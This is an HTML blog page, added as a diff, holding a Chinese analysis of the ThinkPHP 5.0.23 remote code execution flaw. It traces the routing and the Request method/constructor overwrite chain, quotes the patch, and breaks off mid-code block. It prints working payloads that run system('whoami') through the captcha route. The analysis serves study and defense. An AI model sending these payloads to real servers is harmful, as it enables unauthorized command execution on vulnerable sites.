@@ -1,0 +1,1481 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="漏洞复现," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="就算春风秋雨中，共你愿望已不同，还是有点故梦想倾吐">
+<meta name="keywords" content="漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thinkphp 5.0.23 rce 分析">
+<meta property="og:url" content="http://1234xxh.github.io/2021/04/02/1/index.html">
+<meta property="og:site_name" content="sh0wmak3r&#39;s Blog">
+<meta property="og:description" content="就算春风秋雨中，共你愿望已不同，还是有点故梦想倾吐">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://1234xxh.github.io/image/N2LL/21.jpeg">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/jpeg/12939721/1618142998672-82148896-edc7-4acd-bb3d-0ce411e8367c.jpeg#align=left&display=inline&height=816&margin=%5Bobject%20Object%5D&name=image.jpeg&originHeight=816&originWidth=1694&size=521908&status=done&style=none&width=1694">
+<meta property="og:updated_time" content="2021-04-12T14:37:04.225Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="thinkphp 5.0.23 rce 分析">
+<meta name="twitter:description" content="就算春风秋雨中，共你愿望已不同，还是有点故梦想倾吐">
+<meta name="twitter:image" content="http://1234xxh.github.io/image/N2LL/21.jpeg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://1234xxh.github.io/2021/04/02/1/"/>
+
+
+
+
+
+  <title>thinkphp 5.0.23 rce 分析 | sh0wmak3r's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <!-- <div class="headband"></div> -->
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">sh0wmak3r's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">safe | smart contract | binary</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://1234xxh.github.io/2021/04/02/1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="bey0ndm3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/background.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sh0wmak3r's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">thinkphp 5.0.23 rce 分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-04-02T16:56:51+08:00">
+                2021-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2021/04/02/1/" class="leancloud_visitors" data-flag-title="thinkphp 5.0.23 rce 分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>就算春风秋雨中，共你愿望已不同，还是有点故梦想倾吐</p>
+<p><img src="/image/N2LL/21.jpeg" alt="image"><br><a id="more"></a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>论文的开题准备得差不多了，就抽出一点时间好好地、细致地再分析一下thinkphp 5.0.23的rce(之前分析的太水了，粗糙)</p>
+</blockquote>
+<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>ThinkPHP5.0 应用基于 MVC (模型-视图-控制器)的方式来组织。</p>
+<blockquote>
+<p>MVC是一个设计模式，它强制性的使应用程序的输入、处理和输出分开。使用MVC应用程序被分成三个核心 部件:模型(M)、视图(V)、控制器(C)，它们各自处理自己的任务。</p>
+</blockquote>
+<p>5.0的URL访问受路由决定，如果关闭路由或者没有匹配路由的情况下，则是基于<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://serverName/index.php(或者其它应用入口文件)/模块/控制器/操作/参数/值...</span><br></pre></td></tr></table></figure></p>
+<p>一般注册路由是这样的<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> think\Route;</span><br><span class="line">// 注册路由到<span class="keyword">index</span>模块的News控制器的<span class="keyword">read</span>操作 </span><br><span class="line">Route::rule(<span class="string">'new/:id'</span>,<span class="string">'index/News/read'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>我们访问<a href="http://serverName/new/5就会路由到http://serverName/index/news/read/id/5。" target="_blank" rel="noopener">http://serverName/new/5就会路由到http://serverName/index/news/read/id/5。</a><br>当然有几种访问模式</p>
+<blockquote>
+<p>普通模式。如：<a href="http://localhost/index.php?m=模块&amp;a=方法" target="_blank" rel="noopener">http://localhost/index.php?m=模块&amp;a=方法</a></p>
+</blockquote>
+<blockquote>
+<p>pathinfo模式。如：<a href="http://localhost/index.php/模块/方法" target="_blank" rel="noopener">http://localhost/index.php/模块/方法</a></p>
+</blockquote>
+<blockquote>
+<p>rewrite重写（伪静态） 可以自己写相关的rewrite规则，也可以使用系统为我们提供的rewrite规则隐藏掉index.php，生成：<a href="http://localhost/模块/方法" target="_blank" rel="noopener">http://localhost/模块/方法</a></p>
+</blockquote>
+<blockquote>
+<p>兼容模式。当服务器上面不支持pathinfo模式的时候，但是你又在之前的路径访问格式上面，全部用的是pathinfo格式。那么它会提示你路径格式不正确。那么，你就可以用标号为3的兼容模式来处理。他的路径访问类似于<a href="http://localhost/index.php?s=模块/方法" target="_blank" rel="noopener">http://localhost/index.php?s=模块/方法</a></p>
+</blockquote>
+<p>thinkphp5默认的var_pathinfo为s，在config.php中写到<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'var_pathinfo'</span>     =&gt; <span class="string">'s'</span></span><br></pre></td></tr></table></figure></p>
+<p>那么对于thinkphp 5.0.23的rce的利用方法来说，我们访问此url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8888/think-5.0.23/public/index.php?s=captcha</span><br></pre></td></tr></table></figure></p>
+<p>则是注册captcha的路由，其路由信息可以看到为<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123; ["captcha/[:id]"]=&gt; array(5) &#123; ["rule"]=&gt; string(13) "captcha/[:id]" ["route"]=&gt; string(38) "\think\captcha\CaptchaController@index" ["var"]=&gt; array(1) &#123; ["id"]=&gt; int(2) &#125; ["option"]=&gt; array(0) &#123; &#125; ["pattern"]=&gt; array(0) &#123; &#125; &#125; ["hello"]=&gt; bool(true) &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这是Rout::$rules中路由信息，在thinkphp/library/think/Route.php中，在根据PATH_INFOURL路由检测时进行注册。<br>另外我们还需要了解入口文件index.php。</p>
+<blockquote>
+<p>用户请求的PHP文件，负责处理一个请求(注意，不一定是URL请求)的生命周期，最常见的入口文件就是 index.php ，有时候也会为了某些特殊的需求而增加新的入口文件，例如给后台模块单独设置的一个入口文<br>件 admin.php 或者一个控制器程序入口 think都属于入口文件。</p>
+</blockquote>
+<p>在index.php主要是定义应用目录和加载框架引导文件，也就是thinkphp/start.php，一般的以定义一些常量为主，通常，我们不建议在应用入口文件中加入过多的代码，尤其是和业务逻辑相关的代码。<br>进而就是应用</p>
+<blockquote>
+<p>应用在 ThinkPHP 中是一个管理系统架构及生命周期的对象，由系统的 \think\App 类完成，应用通常在 入口文件中被调用和执行，具有相同的应用目录( APP_PATH )的应用我们认为是同一个应用，但一个应用可 能存在多个入口文件。</p>
+</blockquote>
+<p>模块</p>
+<blockquote>
+<p>一个典型的应用是由多个模块组成的，这些模块通常都是应用目录下面的一个子目录，每个模块都有自己独立的配置文件、公共文件和类库文件。</p>
+</blockquote>
+<p>控制器</p>
+<blockquote>
+<p>每个模块拥有独立的 MVC 类库及配置文件，一个模块下面有多个控制器负责响应请求，而每个控制器其实就是 一个独立的控制器类。控制器主要负责请求的接收，并调用相关的模型处理，并最终通过视图输出。严格来说，控制器不应该过多的介入业务逻辑处理。</p>
+</blockquote>
+<p>等等，了解这些一般就可以进行下面的操作。</p>
+<h2 id="抛出问题"><a href="#抛出问题" class="headerlink" title="抛出问题"></a>抛出问题</h2><p>来看给出的payload：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami</span><br></pre></td></tr></table></figure></p>
+<p>两个payload的利用方式有些变化，但是利用点的本质时一样的，都是利用到了thinkphp/library/think/Request.php的method函数可以进行任意函数调用，进而又利用到了他的构造函数__construct可以进行变量覆盖，两者结合就是这些利用链的本质，因此在后来的版本中，官方给出了补丁如下：<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($method, [<span class="string">'GET'</span>, <span class="string">'POST'</span>, <span class="string">'DELETE'</span>, <span class="string">'PUT'</span>, <span class="string">'PATCH'</span>])) &#123;</span><br><span class="line">  $this-&gt;method = $method;</span><br><span class="line">  $this-&gt;&#123;$this-&gt;method&#125;($_POST);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $this-&gt;method = <span class="string">'POST'</span>;</span><br><span class="line">&#125;</span><br><span class="line">unset($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br></pre></td></tr></table></figure></p>
+<p>设置了$method白名单为[‘GET’, ‘POST’, ‘DELETE’, ‘PUT’, ‘PATCH’]，从而限制了其调用本类中的方法。<br>那么针对payload抛出三个问题：</p>
+<h3 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h3><p>为什么需要访问 captcha 模块？</p>
+<h3 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h3><p>system(‘whoami’) 的是怎么构造出来的？</p>
+<h3 id="问题三"><a href="#问题三" class="headerlink" title="问题三"></a>问题三</h3><p>method=GET 如何理解？</p>
+<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>为了便于理解，先从问题二：system(‘whoami’) 的是怎么构造出来的？开始，梳理一下整个流程<br>开始从public/index.php加载框架引导文件thinkphp/start.php，然后执行应用App::run()-&gt;send();，根据App::run()查看执行应用程序的过程：<br>实例化对象<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$request = is_null($request) ? Request::instance() : $request;</span><br></pre></td></tr></table></figure></p>
+<p>然后就是各种绑定，语言加载等操作，之后就是重点了，对应用调度信息的操作，首先获取<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dispatch = self::$dispatch;</span><br></pre></td></tr></table></figure></p>
+<p>由于为NULL进入此分支<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dispatch = self::routeCheck($request, $config);</span><br></pre></td></tr></table></figure></p>
+<p>然后进行URL路由检测，$path就是/模块/控制器/操作/参数/值…，此处就是captcha，根据这个来进行设置路由的调度信息，最后返回给$dispatch。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path   = $request-&gt;path();</span><br></pre></td></tr></table></figure></p>
+<p>下面这里是对/application/route.php中路由配置通过Route::import函数进行添加到调度信息里面<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$files = $config[<span class="string">'route_config_file'</span>];</span><br><span class="line">var_dump($files);<span class="regexp">//array</span>(<span class="number">1</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">5</span>) <span class="string">"route"</span> &#125;</span><br><span class="line"><span class="keyword">foreach</span> ($files as $file) &#123;</span><br><span class="line">    var_dump(CONF_PATH);<span class="regexp">//string</span>(<span class="number">61</span>) <span class="string">"/Applications/MAMP/htdocs/think-5.0.23/public/../application/"</span></span><br><span class="line">    <span class="keyword">if</span> (is_file(CONF_PATH . $file . CONF_EXT)) &#123;</span><br><span class="line">        $rules = include CONF_PATH . $file . CONF_EXT;</span><br><span class="line">        is_array($rules) &amp;&amp; Route::import($rules);</span><br></pre></td></tr></table></figure></p>
+<p>此时$rules存放的就是当前的路由信息了，之后进行路由检测（根据路由定义返回不同的URL调度）<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = Route::check($request, $path, $depr, $config[<span class="string">'url_domain_deploy'</span>]);</span><br></pre></td></tr></table></figure></p>
+<p>后面就对根据路由信息的有效性进行不同分支进行处理，最后把处理后的路由信息返回复制给$dispatch变量。不再进去跟进check函数，现在又回到了run函数中，继续看，然后对路由和请求信息进行记录，最后来到了执行调用分发<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = self::<span class="keyword">exec</span>($dispatch, $config);</span><br></pre></td></tr></table></figure></p>
+<p>到这里分析结束了，执行调用分发的时候就进行了rce，大致就是这个流程，然后回到上一步去跟进check函数，检测URL路由，对路由信息进行处理，然后再获取请求类型<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$method = strtolower($request-&gt;method())</span><br></pre></td></tr></table></figure></p>
+<p>通过请求类型来获取当前请求类型的路由规则，这样说确实有点乱，先看一下当前全部的路由规则<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(<span class="number">12</span>) &#123; [<span class="string">"get"</span>]=&gt; array(<span class="number">2</span>) &#123; [<span class="string">"captcha/[:id]"</span>]=&gt; array(<span class="number">5</span>) &#123; [<span class="string">"rule"</span>]=&gt; string(<span class="number">13</span>) <span class="string">"captcha/[:id]"</span> [<span class="string">"route"</span>]=&gt; string(<span class="number">38</span>) <span class="string">"\think\captcha\CaptchaController@index"</span> [<span class="string">"var"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; <span class="keyword">int</span>(<span class="number">2</span>) &#125; [<span class="string">"option"</span>]=&gt; array(<span class="number">0</span>) &#123; &#125; [<span class="string">"pattern"</span>]=&gt; array(<span class="number">0</span>) &#123; &#125; &#125; [<span class="string">"hello"</span>]=&gt; bool(true) &#125; [<span class="string">"post"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"hello"</span>]=&gt; bool(true) &#125; [<span class="string">"put"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"hello"</span>]=&gt; bool(true) &#125; [<span class="string">"delete"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"hello"</span>]=&gt; bool(true) &#125; [<span class="string">"patch"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"hello"</span>]=&gt; bool(true) &#125; [<span class="string">"head"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"hello"</span>]=&gt; bool(true) &#125; [<span class="string">"options"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"hello"</span>]=&gt; bool(true) &#125; [<span class="string">"*"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"hello"</span>]=&gt; array(<span class="number">5</span>) &#123; [<span class="string">"rule"</span>]=&gt; array(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; array(<span class="number">5</span>) &#123; [<span class="string">"rule"</span>]=&gt; string(<span class="number">3</span>) <span class="string">":id"</span> [<span class="string">"route"</span>]=&gt; string(<span class="number">11</span>) <span class="string">"index/hello"</span> [<span class="string">"var"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; <span class="keyword">int</span>(<span class="number">1</span>) &#125; [<span class="string">"option"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"method"</span>]=&gt; string(<span class="number">3</span>) <span class="string">"get"</span> &#125; [<span class="string">"pattern"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; string(<span class="number">3</span>) <span class="string">"\d+"</span> &#125; &#125; [<span class="number">1</span>]=&gt; array(<span class="number">5</span>) &#123; [<span class="string">"rule"</span>]=&gt; string(<span class="number">5</span>) <span class="string">":name"</span> [<span class="string">"route"</span>]=&gt; string(<span class="number">11</span>) <span class="string">"index/hello"</span> [<span class="string">"var"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"name"</span>]=&gt; <span class="keyword">int</span>(<span class="number">1</span>) &#125; [<span class="string">"option"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"method"</span>]=&gt; string(<span class="number">4</span>) <span class="string">"post"</span> &#125; [<span class="string">"pattern"</span>]=&gt; array(<span class="number">0</span>) &#123; &#125; &#125; &#125; [<span class="string">"route"</span>]=&gt; string(<span class="number">0</span>) <span class="string">""</span> [<span class="string">"var"</span>]=&gt; array(<span class="number">0</span>) &#123; &#125; [<span class="string">"option"</span>]=&gt; array(<span class="number">0</span>) &#123; &#125; [<span class="string">"pattern"</span>]=&gt; array(<span class="number">0</span>) &#123; &#125; &#125; &#125; [<span class="string">"alias"</span>]=&gt; array(<span class="number">0</span>) &#123; &#125; [<span class="string">"domain"</span>]=&gt; array(<span class="number">0</span>) &#123; &#125; [<span class="string">"pattern"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"name"</span>]=&gt; string(<span class="number">3</span>) <span class="string">"\w+"</span> &#125; [<span class="string">"name"</span>]=&gt; array(<span class="number">2</span>) &#123; [<span class="string">"\think\captcha\captchacontroller@index"</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="number">0</span>]=&gt; array(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">13</span>) <span class="string">"captcha/[:id]"</span> [<span class="number">1</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; <span class="keyword">int</span>(<span class="number">2</span>) &#125; [<span class="number">2</span>]=&gt; NULL [<span class="number">3</span>]=&gt; NULL &#125; &#125; [<span class="string">"index/hello"</span>]=&gt; array(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; array(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">9</span>) <span class="string">"hello/:id"</span> [<span class="number">1</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; <span class="keyword">int</span>(<span class="number">1</span>) &#125; [<span class="number">2</span>]=&gt; NULL [<span class="number">3</span>]=&gt; NULL &#125; [<span class="number">1</span>]=&gt; array(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">11</span>) <span class="string">"hello/:name"</span> [<span class="number">1</span>]=&gt; array(<span class="number">1</span>) &#123; [<span class="string">"name"</span>]=&gt; <span class="keyword">int</span>(<span class="number">1</span>) &#125; [<span class="number">2</span>]=&gt; NULL [<span class="number">3</span>]=&gt; NULL &#125; &#125; &#125; &#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后根据返回的$method来进行操作<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rules = isset(self::$rules[$method]) ? self::$rules[$method] : [];</span><br></pre></td></tr></table></figure></p>
+<p>可以看到对$rules根据键取值，又可以发现[“captcha/[:id]”]的路由规则对应[“get”]，那么如果想取得[“captcha/[:id]”]的路由规则那么请求method就得需要get，因此问题三就解决了。继续跟进$request-&gt;method()<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function method($method = false)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (true === $method) &#123;</span><br><span class="line">            <span class="keyword">return</span> $this-&gt;server(<span class="string">'REQUEST_METHOD'</span>) ?: <span class="string">'GET'</span>;</span><br><span class="line">        &#125; elseif (!$this-&gt;method) &#123;</span><br><span class="line">            var_dump($this-&gt;method);</span><br><span class="line">            <span class="keyword">if</span> (isset($_POST[Config::get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">                $this-&gt;method  = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line">                $this-&gt;&#123;$this-&gt;method&#125;($_POST);</span><br><span class="line">                ......</span><br><span class="line"><span class="keyword">return</span> $this-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>根据传入的$method进行不同的分支就行处理，显然此刻进入了elseif分支，这里根据Config::get(‘var_method’)，在application/config.php中<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 表单请求类型伪装变量</span><br><span class="line">    <span class="string">'var_method'</span>             =&gt; <span class="string">'_method'</span>,</span><br></pre></td></tr></table></figure></p>
+<p>也就是根据POST的data中的_method参数进行判断，然后赋值给$this-&gt;method，再进行任意函数的调用，就如payload中的<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=<span class="keyword">system</span></span><br></pre></td></tr></table></figure></p>
+<p>那么就是$this-&gt;__construct(filter[]=system)，为什么filter要是数组呢？不是数组可以不可以呢？这个后面会说到，另外为什么调用构造函数，就如开头说到的这是一个利用点，实现变量覆盖。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">protected function __construct($options = [])</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">foreach</span> ($options as $name =&gt; $item) &#123;</span><br><span class="line">           <span class="keyword">if</span> (property_exists($this, $name)) &#123;</span><br><span class="line">               $this-&gt;$name = $item;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p>
+<p>显示判断是否存在这个变量，存在的话就行覆盖，$this-&gt;filter = array(1) { [0]=&gt; string(6) “system” }，同理$this-&gt;server = array(1) { [“REQUEST_METHOD”]=&gt; string(6) “whoami” }，$this-&gt;method = get（因为我们实际是post请求）。<br>然后回到$request-&gt;method()中，return $this-&gt;method到check中的$method，之后获取到当前路由信息。到现在routeCheck执行完毕，也就是 $dispatch调用信息已经确定了，后面就是执行应用分发函数exec的分析。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 